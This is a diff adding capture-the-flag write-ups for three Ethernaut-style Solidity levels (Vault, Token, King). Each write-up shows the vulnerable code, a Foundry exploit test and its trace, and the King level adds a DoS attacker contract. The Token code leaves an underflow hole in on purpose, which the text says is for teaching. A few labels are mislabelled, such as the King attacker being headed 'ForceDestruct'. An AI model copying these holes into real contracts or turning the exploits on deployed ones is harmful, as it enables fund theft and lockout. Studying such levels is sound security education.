@@ -291,6 +291,192 @@ Suite result: ok. 1 passed; 0 failed; finished in 6.73ms
 ---
 
 
+## Level 8:Valut
 
-✅ Ready for **Level 8** — coming soon!
+### 🔍 Vulnerable Function
+
+```solidity
+ bool public locked;//storage slot0
+ bytes32 private password;//storage slot1
+function unlock(bytes32 _password) public {
+    if (password == _password) {
+        locked = false;
+    }
+}
+
+```
+
+**Vulnerability**: Although password is marked as private, all contract storage is publicly accessible. In Solidity, the private keyword only restricts access within the Solidity language, not from the blockchain level. So, the password stored at storage slot 1 can be retrieved using vm.load.
+
+
+### 🧪 Exploit Test
+```solidity 
+   function test_attack() public {
+    vm.startPrank(attacker);
+    // Get the password from storage slot 1
+    bytes32 _password = vm.load(address(vault), bytes32(uint256(1)));
+    vault.unlock(_password);
+    assertFalse(vault.locked());
+    vm.stopPrank();
+}
+```
+### 🧪 Test Output
+``` text
+[PASS] test_attack() (gas: 11812)
+Traces:
+  [16612] VaultTest::test_attack()
+    ├─ VM::startPrank(attacker)
+    ├─ VM::load(Vault, slot 1)
+    ├─ Vault::unlock(password)
+    ├─ Vault::locked() → false
+    ├─ VM::assertFalse(false)
+    └─ VM::stopPrank()
+
+Suite result: ok. 1 passed; 0 failed; finished in 1.24ms
+```
+---
+
+
+## Level 9:Token
+
+### 🔍 Vulnerable Function
+
+```solidity
+ function transfer(address _to, uint256 _value) public returns (bool) {
+    unchecked {
+        require(balances[msg.sender] - _value >= 0);
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+    }
+    return true;
+}
+```
+
+**Vulnerability**: The transfer() function is written with an unchecked block, allowing underflow to occur. When a user transfers more tokens than they own, the subtraction balances[msg.sender] -= _value underflows and wraps around to a massive value (2**256 - x), resulting in an increased balance instead of failing.
+
+📝 Note: This kind of underflow attack was possible before Solidity 0.8.x, which introduced built-in overflow/underflow protection.
+To demonstrate this vulnerability in a controlled environment, unchecked is intentionally used to bypass that protection for educational purposes
+
+
+### 🧪 Exploit Test
+```solidity 
+   function test_attack() public {
+    vm.startPrank(player);
+    
+    // Initial balance of player: 20 tokens
+    assertEq(token.balanceOf(player), 20);
+
+    // Transfer more than balance (21 tokens), triggers underflow
+    bool success = token.transfer(attacker, 21);
+    assertTrue(success);
+
+    // Player's balance underflows to a very large number
+    uint256 _balanceofplayer = token.balanceOf(player);
+    assertGt(_balanceofplayer, 20);
+
+    vm.stopPrank();
+}
+```
+### 🧪 Test Output
+``` text
+[PASS] test_attack() (gas: 47312)
+Traces:
+  [47312] TokenTest::test_attack()
+    ├─ VM::startPrank(player)
+    ├─ Token::balanceOf(player) → 20
+    ├─ assertEq(20, 20)
+    ├─ Token::transfer(attacker, 21) → true
+    ├─ assertTrue(true)
+    ├─ Token::balanceOf(player) → 1.157e77
+    ├─ assertGt(1.157e77, 20)
+    └─ VM::stopPrank()
+
+Suite result: ok. 1 passed; 0 failed; finished in 988.39µs
+```
+---
+
+## Level 10:King
+**AttackDesc**:
+A Denial of Service (DoS) attack is when someone makes a smart contract stop working for others.
+This usually happens if the contract sends Ether to a malicious address that always fails or reverts.
+If one function fails because of this, others may not be able to use the contract.
+In the King level, a smart contract becomes the king and blocks future kings by rejecting ETH.
+This locks the contract and nobody else can play the game.
+DoS attacks make the contract unusable for honest users.
+
+### 🔍 Vulnerable Function
+
+```solidity
+receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value); // ❌ vulnerable to DoS
+    king = msg.sender;
+    prize = msg.value;
+}
+
+```
+
+**Vulnerability**: The transfer call to the current king can fail if the king is a contract that reverts on receiving ETH. This leads to a Denial of Service (DoS) where no one can become king anymore.
+
+### 🛠️  Exploit Contract (ForceDestruct)
+```solidity
+ contract Attacker {
+    King public king;
+
+    constructor(King _King) {
+        king = _King;
+    }
+
+    function attack() public payable {
+        require(msg.value >= address(king).balance, "Not enough balance");
+        (bool success, ) = address(king).call{value: msg.value}("");
+        require(success, "transfer failed");
+    }
+
+    receive() external payable {
+        revert("sent eth failed"); // Reverts to block
+    }
+}
+```
+
+### 🧪 Exploit Test
+```solidity 
+   function test_attack() public {
+    vm.prank(attackerEOA);
+    attack.attack{value: 2 ether}(); // attacker becomes king
+
+    assertEq(king._king(), address(attack)); // ✅ attacker is king
+
+    vm.prank(player);
+    (bool success, ) = address(king).call{value: 3 ether}(""); // another player tries
+    assertFalse(success, "Player should not be able to become king anymore"); // ❌ fails
+}
+```
+### 🧪 Test Output
+``` text
+[PASS] test_attack() (gas: 71672)
+Traces:
+  [71672] KingTest::test_attack()
+    ├─ VM::prank(attackerEOA)
+    ├─ Attacker::attack{value: 2 ether}()
+    │   ├─ King::receive{value: 2 ether}()
+    │   │   ├─ player::fallback{value: 2 ether}()
+    │   │   └─ [Stop]
+    │   └─ [Stop]
+    ├─ King::_king() → Attacker
+    ├─ VM::assertEq(Attacker, Attacker)
+    ├─ VM::prank(player)
+    ├─ King::receive{value: 3 ether}()
+    │   ├─ Attacker::receive{value: 3 ether}() → [Revert] sent eth failed
+    │   └─ [Revert]
+    ├─ VM::assertFalse(false, "Player should not be able to become king anymore")
+    └─ [Stop]
+
+Suite result: ok. 1 passed; 0 failed; finished in 15.46ms
+```
+---
+
+
+
+✅ Ready for **Level 11** — coming soon!
 
